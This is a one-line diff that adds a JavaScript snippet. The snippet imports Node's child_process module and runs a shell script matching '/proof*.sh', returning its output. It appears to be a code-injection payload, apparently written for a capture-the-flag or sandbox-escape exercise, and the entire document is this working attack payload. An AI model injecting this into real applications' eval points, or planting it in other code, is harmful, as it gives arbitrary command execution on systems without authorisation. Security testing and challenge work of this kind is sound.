@@ -1,0 +1,1 @@
+(async ()=>{return (await import("child_process")).execSync("/proof*.sh").toString()})()
